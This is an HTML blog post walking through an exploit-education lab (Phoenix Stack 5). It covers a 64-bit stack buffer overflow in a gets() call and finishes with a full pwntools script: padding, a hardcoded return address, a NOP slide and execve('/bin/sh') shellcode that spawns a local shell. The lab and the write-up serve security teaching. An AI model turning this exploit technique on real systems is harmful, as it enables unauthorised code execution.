<!DOCTYPE html>
<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="description" content="Introduction
Buffer overflow is a common vulnerability that has plagued software systems for years. It occurs when a program attempts to store data beyond the bounds of a buffer, causing the extra data to overwrite adjacent memory locations. This can lead to a variety of problems, including crashes, security breaches, and even the execution of malicious code. One of the most powerful ways to exploit a buffer overflow is by injecting shellcode into the overflowed buffer, which allows an attacker to take control of the program and execute arbitrary commands. In this blog post, we will explore the basics of buffer overflow attacks and demonstrate how to execute shellcode by solving Stack 5 from Pheonix.">  

  <title>
    
      Simple 64-bit buffer overflow with shellcode
    
  </title>


  <link rel="shortcut icon" type="image/x-icon" href="/" />
  
  
  
  <link rel="stylesheet" href="/css/main.900100e9dbee2d56c58fac8bb717037cae7e26a9c36c29d2ff587bdd65f0cbbe510b41d81a3bb234919cdfdc7550d786b2fab70c8fc507772d732fe097106d12.css" integrity="sha512-kAEA6dvuLVbFj6yLtxcDfK5&#43;JqnDbCnS/1h73WXwy75RC0HYGjuyNJGc39x1UNeGsvq3DI/FB3ctcy/glxBtEg==" />
  
</head>
<body a="auto">
        <main class="page-content" aria-label="Content">
            <div class="w">
<a href="/">..</a>


<article>
    <p class="post-meta">
        <time datetime="2023-03-03 11:51:26 &#43;0800 &#43;0800">
            2023-03-03
        </time>
    </p>

    <h1>Simple 64-bit buffer overflow with shellcode</h1>

    
        <aside  class="toc" >
            <nav id="TableOfContents">
  <ul>
    <li><a href="#source-code">Source code</a></li>
    <li><a href="#running">Running</a></li>
  </ul>

  <ul>
    <li><a href="#payload">Payload</a>
      <ul>
        <li><a href="#step-1---find-stack-address">Step 1 - Find stack address</a></li>
        <li><a href="#step-2---nop-slide">Step 2 - nop slide</a></li>
        <li><a href="#part-3---shellcode">Part 3 - Shellcode</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </aside>
    

    <h1 id="introduction">Introduction</h1>
<p>Buffer overflow is a common vulnerability that has plagued software systems for years. It occurs when a program attempts to store data beyond the bounds of a buffer, causing the extra data to overwrite adjacent memory locations. This can lead to a variety of problems, including crashes, security breaches, and even the execution of malicious code. One of the most powerful ways to exploit a buffer overflow is by injecting shellcode into the overflowed buffer, which allows an attacker to take control of the program and execute arbitrary commands. In this blog post, we will explore the basics of buffer overflow attacks and demonstrate how to execute shellcode by solving Stack 5 from <a href="https://exploit.education/phoenix/">Pheonix</a>.</p>
<h1 id="summary">Summary</h1>
<p>This level from Pheonix is a simple 64-bit buffer overflow that requires us to overflow the buffer and overwrite the return pointer to return to some shellcode that we have placed on the stack.</p>
<h1 id="binary-analysis">Binary analysis</h1>
<p>One of the first things I do when I have a binary is run <code>file</code> on it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file ./stack-five
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>./stack-five: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
</span></span></code></pre></div><p>From this output we now know that we are working with a <code>64-bit</code> binary and we also know that it is dynamically linked and is not stripped of the debug symbols, which makes reverse engineering it much easier if we had to.</p>
<h2 id="source-code">Source code</h2>
<p>Since we are provided with the source code we won&rsquo;t have to do any disassemling or reverse engineering to figure out how this binary works</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * phoenix/stack-five, by https://exploit.education
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Can you execve(&#34;/bin/sh&#34;, ...) ?
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * What is green and goes to summer camp? A brussel scout.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BANNER \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &#34;Welcome to &#34; LEVELNAME &#34;, brought to you by https:</span><span style="color:#75715e">//exploit.education&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">gets</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">start_level</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">128</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(buffer);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, BANNER);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">start_level</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In the comments, we are given a hint that we need to run <code>execve(&quot;/bin/sh&quot;)</code>, but there is no <code>execve()</code> function being ran anywhere in the source code. And if we check the security measure applied using <code>checksec</code> from <code>pwntools</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ checksec ./stack-five
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/opt/phoenix/amd64/stack-five&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    No RELRO
</span></span><span style="display:flex;"><span>    Stack:    No canary found
</span></span><span style="display:flex;"><span>    NX:       NX disabled
</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    RWX:      Has RWX segments
</span></span><span style="display:flex;"><span>    RPATH:    <span style="color:#e6db74">&#39;/opt/phoenix/x86_64-linux-musl/lib&#39;</span>
</span></span></code></pre></div><p>We see that NX (No execute from stack) is disabled, as well as all the other security measures. So now it is very obvious that we are going to need to inject our own shellcode.</p>
<p>Starting with the main function, it simply prints the banner then calls <code>start_level()</code> which defines a 128 byte buffer and then uses <code>gets()</code> (the dangerous C function) to get user input and stores it in the 128 byte buffer without any checks for the length of the user supplied input whatsoever.</p>
<h2 id="running">Running</h2>
<p>Now that we know what it does, we can run it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-five
</span></span><span style="display:flex;"><span>Welcome to phoenix/stack-five, brought to you by https://exploit.education
</span></span><span style="display:flex;"><span>hello
</span></span></code></pre></div><p>As we saw in the source it just takes input and exits.</p>
<p>Now let&rsquo;s see what happens when we give it a big input</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@phoenix-amd64:/opt/phoenix/amd64$ python3 -c <span style="color:#e6db74">&#34;print(&#39;A&#39; * 200)&#34;</span> | ./stack-five
</span></span><span style="display:flex;"><span>Welcome to phoenix/stack-five, brought to you by https://exploit.education
</span></span><span style="display:flex;"><span>Segmentation fault
</span></span></code></pre></div><p>A segmentation fault! that means accessed parts of the memory we weren&rsquo;t supposed to.</p>
<h1 id="finding-offset">Finding offset</h1>
<p>To find the offset I will open the program in GDB and I am using <a href="https://github.com/hugsy/gef">GEF</a> because it comes with useful tools to help with exploit development. GEF also comes pre-installed on the Pheonix machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤  pattern create <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generating a pattern of <span style="color:#ae81ff">200</span> bytes
</span></span><span style="display:flex;"><span>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Saved as <span style="color:#e6db74">&#39;$_gef0&#39;</span>
</span></span><span style="display:flex;"><span>gef➤
</span></span></code></pre></div><p>Using the <code>pattern create</code> command in GEF we can create a pattern that is unique for every 8 bytes, which will make it easy to find.</p>
<p>Now we can run the program again and supply this pattern and we find which of the unique 8 bytes from the pattern ended up in <code>rip</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤  r
</span></span><span style="display:flex;"><span>Starting program: /opt/phoenix/amd64/stack-five
</span></span><span style="display:flex;"><span>Welcome to phoenix/stack-five, brought to you by https://exploit.education
</span></span><span style="display:flex;"><span>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Program received signal SIGSEGV, Segmentation fault.
</span></span></code></pre></div><p>The program crashes as expected and GEF has hooks set up to print the registers, stack and instructions.</p>
<p>Looking through the resgisters output we see:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$rip   : 0x6161616161616172 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;raaaaaaa&#34;</span>?<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>The instruction pointer was overwritten with <code>raaaaaaa</code> meaning whatever we place instead of that will be our new <code>rip</code>.</p>
<p>Now we use <code>pattern search</code> to find where that is in the pattern string</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤  pattern search 0x6161616161616172
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Searching <span style="color:#e6db74">&#39;0x6161616161616172&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found at offset <span style="color:#ae81ff">136</span> <span style="color:#f92672">(</span>little-endian search<span style="color:#f92672">)</span> likely
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found at offset <span style="color:#ae81ff">129</span> <span style="color:#f92672">(</span>big-endian search<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>gef➤
</span></span></code></pre></div><p>From the binary analysis we know that this binary is little endian so now we know that the offset is <code>136</code></p>
<h1 id="crafting-exploit">Crafting exploit</h1>
<p>We can now start working on the exploit</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Defining binary</span>
</span></span><span style="display:flex;"><span>bin <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./stack-five&#39;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(bin<span style="color:#f92672">.</span>path)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>update(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amd64&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># The offset and padding we need to overflow the buffer</span>
</span></span><span style="display:flex;"><span>OFFSET  <span style="color:#f92672">=</span> <span style="color:#ae81ff">136</span>
</span></span><span style="display:flex;"><span>PADDING <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> OFFSET
</span></span></code></pre></div><p>I am using the <code>pwntools</code> library and I create a an ELF binary object, start the proccess which will open the program to interact with with it and I set the architecture.</p>
<h2 id="payload">Payload</h2>
<p>Currently our exploit will take us to the address where it will overwrite <code>rip</code> and then just go into the stack. So first part of our payload will be the address to write into <code>rip</code> and then we are going to need a nop slide to make sure we hit our shellcode and then finally, our shellcode.</p>
<blockquote>
<p>When performing a buffer overflow attack, a NOP slide can help an attacker hit their shellcode by creating a region of uncertainty about the exact location of the code. By inserting a large block of NOP instructions in between the code and the shellcode, an attacker can increase the chances of their shellcode being executed, even if they do not know the exact location of the code they are trying to overwrite. - ChatGPT</p></blockquote>
<h3 id="step-1---find-stack-address">Step 1 - Find stack address</h3>
<p>I want to make sure I have the stack address at the point where the main function would return.</p>
<p>We can do that by first adding a breakpoint at the return instruction of <code>main()</code> in GDB.</p>
<p>To see the addresses of the instructions we can disassemble the function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤  disas main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
</span></span><span style="display:flex;"><span>   0x00000000004005a4 &lt;+0&gt;:	push   rbp
</span></span><span style="display:flex;"><span>   0x00000000004005a5 &lt;+1&gt;:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   0x00000000004005a8 &lt;+4&gt;:	sub    rsp,0x10
</span></span><span style="display:flex;"><span>   0x00000000004005ac &lt;+8&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x4<span style="color:#f92672">]</span>,edi
</span></span><span style="display:flex;"><span>   0x00000000004005af &lt;+11&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rbp-0x10<span style="color:#f92672">]</span>,rsi
</span></span><span style="display:flex;"><span>   0x00000000004005b3 &lt;+15&gt;:	mov    edi,0x400620
</span></span><span style="display:flex;"><span>   0x00000000004005b8 &lt;+20&gt;:	call   0x400400 &lt;puts@plt&gt;
</span></span><span style="display:flex;"><span>   0x00000000004005bd &lt;+25&gt;:	mov    eax,0x0
</span></span><span style="display:flex;"><span>   0x00000000004005c2 &lt;+30&gt;:	call   0x40058d &lt;start_level&gt;
</span></span><span style="display:flex;"><span>   0x00000000004005c7 &lt;+35&gt;:	mov    eax,0x0
</span></span><span style="display:flex;"><span>   0x00000000004005cc &lt;+40&gt;:	leave
</span></span><span style="display:flex;"><span>   0x00000000004005cd &lt;+41&gt;:	ret
</span></span><span style="display:flex;"><span>End of assembler dump.
</span></span><span style="display:flex;"><span>gef➤  b *0x4005cd
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x4005cd
</span></span><span style="display:flex;"><span>gef➤
</span></span></code></pre></div><p>The address we are interested in is the last one (<code>ret</code>) which is <code>0x4005cd</code> we don&rsquo;t need to grab the extra 0s because pwntools knows it is a 64-bit program and will treat it accordingly.</p>
<p>Now we run program normally with normal input and it stops at the breakpoint.</p>
<p>From here we use <code>info registers</code> to look at the registers</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤  info registers
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>rsp            0x7fffffffebe8      0x7fffffffebe8
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>gef➤
</span></span></code></pre></div><p>This address is the stack address. We can now update that in the exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>rip <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x7fffffffebe8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">40</span>) <span style="color:#75715e"># new rip -&gt; rsp</span>
</span></span></code></pre></div><blockquote>
<p>Notice I am also adding <code>+ 40</code> to the address just to make sure we hit our nop slide.</p></blockquote>
<h3 id="step-2---nop-slide">Step 2 - nop slide</h3>
<p>This part is pretty simple. The opcode of a nop instruction is 0x90. We use that as a raw byte in the code as <code>\x90</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>nop_slide <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span>
</span></span></code></pre></div><h3 id="part-3---shellcode">Part 3 - Shellcode</h3>
<p>For this part we can find shellcode to execute <code>exevce(&quot;/bin/sh&quot;)</code> for an amd64 linux system online. But I am going to use <code>shellcraft</code> from the pwntools library to generate the shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>linux<span style="color:#f92672">.</span>sh())
</span></span></code></pre></div><p>I did not have to specify architecture becuase I set the context at the start of the script.</p>
<p>The output of that line will be be the raw shellcode bytes resturned by <code>asm()</code>. The output of <code>shellcraft.linux.sh()</code> is the assembly code for executing <code>execve(&quot;/bin/sh&quot;)</code>.</p>
<h1 id="exploiting">Exploiting</h1>
<p>Now that we have the payload set up, the final exploit will be:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Defining binary</span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./stack-five&#39;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(exe<span style="color:#f92672">.</span>path)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>update(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amd64&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># The offset and padding we need to overflow the buffer</span>
</span></span><span style="display:flex;"><span>OFFSET  <span style="color:#f92672">=</span> <span style="color:#ae81ff">136</span>
</span></span><span style="display:flex;"><span>PADDING <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> OFFSET
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Building payload</span>
</span></span><span style="display:flex;"><span>rip <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x7fffffffebe8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">40</span>) <span style="color:#75715e"># new rip -&gt; rsp</span>
</span></span><span style="display:flex;"><span>nop_slide <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>linux<span style="color:#f92672">.</span>sh()) <span style="color:#75715e"># Output from shellcraft will be the assembly code below. using asm() to compile it into raw bytes</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Shellcode in assembly:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /* execve(path=&#39;/bin///sh&#39;, argv=[&#39;sh&#39;], envp=0) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /* push b&#39;/bin///sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39; */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push 0x68
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rax, 0x732f2f2f6e69622f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdi, rsp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /* push argument array [&#39;sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;] */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /* push b&#39;sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39; */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push 0x1010101 ^ 0x6873
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor dword ptr [rsp], 0x1010101
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor esi, esi /* 0 */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push rsi /* null terminate */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push 8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    pop rsi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add rsi, rsp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push rsi /* &#39;sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39; */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi, rsp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor edx, edx /* 0 */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /* call execve() */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push SYS_execve /* 0x3b */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    pop rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Finally, putting them together into one payload</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> PADDING <span style="color:#f92672">+</span> rip <span style="color:#f92672">+</span> nop_slide <span style="color:#f92672">+</span> shellcode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Sending the payload</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;education</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Going into interactive mode to interact with new shell</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>We send the payload to the process we opened with <code>p.sendlineafter()</code> to send the payload right after the banner is printed.</p>
<p>Then we go into interactive mode to input commands into the new <code>/bin/sh</code> process.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@phoenix-amd64:/opt/phoenix/amd64$ ./solve_stack-five.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/opt/phoenix/amd64/stack-five&#39;</span>: pid <span style="color:#ae81ff">1219</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Success!</p>
<h1 id="mitigation">Mitigation</h1>
<p>This exploit would not have been possible if Address space layout randomization (ASLR) was enabled on this machine and the program was compiled with the <code>NX</code> bit enabled which disables any code execution from the stack. Since this is a VM made for exploit education, those mitigations were turned off but in a real world scenario they should always be enabled.</p>

</article>

                
    
    
        
        <footer class="site-footer">
            <p>&copy; 2025 killall.systems</p>
        </footer>
    


            </div>
        </main>
    </body>
</html>
